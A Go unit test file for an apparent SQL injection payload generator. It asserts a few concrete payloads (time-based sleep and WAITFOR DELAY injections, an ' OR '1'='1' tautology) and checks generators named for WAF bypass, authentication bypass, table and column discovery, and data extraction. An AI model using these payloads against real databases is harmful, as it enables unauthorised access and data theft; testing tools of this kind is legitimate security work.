package generator

import (
	"testing"
)

func TestNewPolyglotGenerator(t *testing.T) {
	g := NewPolyglotGenerator()
	if g == nil {
		t.Fatal("NewPolyglotGenerator() returned nil")
	}
}

func TestPolyglotGenerator_HexEncode(t *testing.T) {
	g := NewPolyglotGenerator()

	tests := []struct {
		input    string
		expected string
	}{
		{"test", "74657374"},
		{"admin", "61646d696e"},
		{"", ""},
		{"1=1", "313d31"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := g.HexEncode(tt.input)
			if got != tt.expected {
				t.Errorf("HexEncode(%q) = %q, want %q", tt.input, got, tt.expected)
			}
		})
	}
}

func TestPolyglotGenerator_GetTimeBasedPolyglot(t *testing.T) {
	g := NewPolyglotGenerator()

	// Test PostgreSQL specific
	pg := g.getTimeBasedPolyglot([]string{"PostgreSQL"})
	if pg.Payload != "' AND pg_sleep(5)--" {
		t.Errorf("Expected ' AND pg_sleep(5)-- for PostgreSQL, got %q", pg.Payload)
	}

	// Test MySQL specific
	mysql := g.getTimeBasedPolyglot([]string{"MySQL"})
	if mysql.Payload != "' AND SLEEP(5)--" {
		t.Errorf("Expected ' AND SLEEP(5)-- for MySQL, got %q", mysql.Payload)
	}

	// Test multiple (should match first recognized DBMS in the list)
	multi := g.getTimeBasedPolyglot([]string{"Oracle", "MSSQL", "MySQL"})
	if multi.Payload != "'; WAITFOR DELAY '0:0:5'--" {
		t.Errorf("Expected MSSQL payload for multiple DBMS, got %q", multi.Payload)
	}

	// Test unknown
	unknown := g.getTimeBasedPolyglot([]string{"UnknownDB"})
	if unknown.Payload != "' AND SLEEP(5)--" {
		t.Errorf("Expected fallback MySQL payload for unknown DBMS, got %q", unknown.Payload)
	}
}

func TestPolyglotGenerator_GeneratePolyglotForContext(t *testing.T) {
	g := NewPolyglotGenerator()

	ctxInt := InjectionContext{QuoteType: "none"}
	pgInt := g.GeneratePolyglotForContext(ctxInt)
	if pgInt.Payload != "' OR '1'='1'" {
		t.Errorf("Expected fallback payload for INTEGER context, got %q", pgInt.Payload)
	}

	ctxStr := InjectionContext{QuoteType: "double"}
	pgStr := g.GeneratePolyglotForContext(ctxStr)
	if pgStr.Payload != "'=\"\"=\"" {
		t.Errorf("Expected double quote payload for STRING context, got %q", pgStr.Payload)
	}

	ctxUnknown := InjectionContext{QuoteType: "single"}
	pgUnknown := g.GeneratePolyglotForContext(ctxUnknown)
	if pgUnknown.Payload != "' OR '1'='1'" {
		t.Errorf("Expected fallback payload for UNKNOWN context, got %q", pgUnknown.Payload)
	}

	// Contexts should yield different primary payloads
	if pgInt.Payload == pgStr.Payload {
		t.Error("Expected different payloads for INTEGER vs STRING contexts")
	}
}

func TestPolyglotGenerator_PolyglotCollections(t *testing.T) {
	g := NewPolyglotGenerator()

	// List of functions returning []Polyglot
	polyglotFuncs := []struct {
		name string
		fn   func() []Polyglot
	}{
		{"GenerateUniversalPolyglots", g.GenerateUniversalPolyglots},
		{"GenerateWAFBypassPolyglots", g.GenerateWAFBypassPolyglots},
		{"GenerateEncodingPolyglots", g.GenerateEncodingPolyglots},
		{"GenerateCaseVariationPolyglots", g.GenerateCaseVariationPolyglots},
		{"GenerateTimeBasedPolyglots", g.GenerateTimeBasedPolyglots},
		{"GenerateUnionBasedPolyglots", g.GenerateUnionBasedPolyglots},
		{"GenerateErrorBasedPolyglots", g.GenerateErrorBasedPolyglots},
		{"GenerateAuthenticationBypassPolyglots", g.GenerateAuthenticationBypassPolyglots},
		{"GenerateInformationDisclosurePolyglots", g.GenerateInformationDisclosurePolyglots},
		{"GenerateTableDiscoveryPolyglots", g.GenerateTableDiscoveryPolyglots},
		{"GenerateColumnDiscoveryPolyglots", g.GenerateColumnDiscoveryPolyglots},
		{"GenerateDataExtractionPolyglots", g.GenerateDataExtractionPolyglots},
		{"GenerateAllPolyglots", g.GenerateAllPolyglots},
	}

	for _, tt := range polyglotFuncs {
		t.Run(tt.name, func(t *testing.T) {
			result := tt.fn()
			if len(result) == 0 {
				t.Fatalf("%s() returned empty slice", tt.name)
			}
			if result[0].Payload == "" {
				t.Errorf("%s() first element has empty payload", tt.name)
			}
			if result[0].Description == "" {
				t.Errorf("%s() first element has empty description", tt.name)
			}
		})
	}
}

func TestPolyglotGenerator_StringCollections(t *testing.T) {
	g := NewPolyglotGenerator()

	// List of functions returning []string
	stringFuncs := []struct {
		name string
		fn   func() []string
	}{
		{"GenerateSensitiveData", g.GenerateSensitiveData},
		{"GenerateAlternativeOperators", g.GenerateAlternativeOperators},
		{"GenerateNoCommaBypass", g.GenerateNoCommaBypass},
		{"GenerateStringConcatenationBypass", g.GenerateStringConcatenationBypass},
		{"GenerateHashBypass", g.GenerateHashBypass},
		{"GenerateHexInjection", g.GenerateHexInjection},
		{"GenerateWAFBypassAll", g.GenerateWAFBypassAll},
		{"GenerateWAFBypassComment", g.GenerateWAFBypassComment},
		{"GenerateWAFBypassAltWhitespace", g.GenerateWAFBypassAltWhitespace},
		{"GenerateWAFBypassUnicode", g.GenerateWAFBypassUnicode},
		{"GenerateWAFBypassParenthesis", g.GenerateWAFBypassParenthesis},
		{"GenerateWAFBypassAlternativeOperators", g.GenerateWAFBypassAlternativeOperators},
		{"GenerateWAFBypassLogicalAlternatives", g.GenerateWAFBypassLogicalAlternatives},
		{"GenerateWAFBypassNoComma", g.GenerateWAFBypassNoComma},
		{"GenerateWAFBypassStringConcat", g.GenerateWAFBypassStringConcat},
		{"GenerateWAFBypassHashRawBinary", g.GenerateWAFBypassHashRawBinary},
		{"GenerateWAFBypassHexInjection", g.GenerateWAFBypassHexInjection},
	}

	for _, tt := range stringFuncs {
		t.Run(tt.name, func(t *testing.T) {
			result := tt.fn()
			if len(result) == 0 {
				t.Fatalf("%s() returned empty slice", tt.name)
			}
			if result[0] == "" {
				t.Errorf("%s() first element is empty string", tt.name)
			}
		})
	}
}

func TestPolyglotGenerator_MapCollections(t *testing.T) {
	g := NewPolyglotGenerator()

	t.Run("GenerateEncoding", func(t *testing.T) {
		result := g.GenerateEncoding()
		if len(result) == 0 {
			t.Fatal("GenerateEncoding() returned empty map")
		}
		// Check if space encoding exists
		if _, ok := result["space_comment"]; !ok {
			t.Error("GenerateEncoding() missing expected key 'space_comment'")
		}
	})

	t.Run("GenerateCategories", func(t *testing.T) {
		result := g.GenerateCategories()
		if len(result) == 0 {
			t.Fatal("GenerateCategories() returned empty map")
		}
		// Check if a known category exists
		if _, ok := result["universal"]; !ok {
			t.Error("GenerateCategories() missing expected key 'universal'")
		}
	})
}
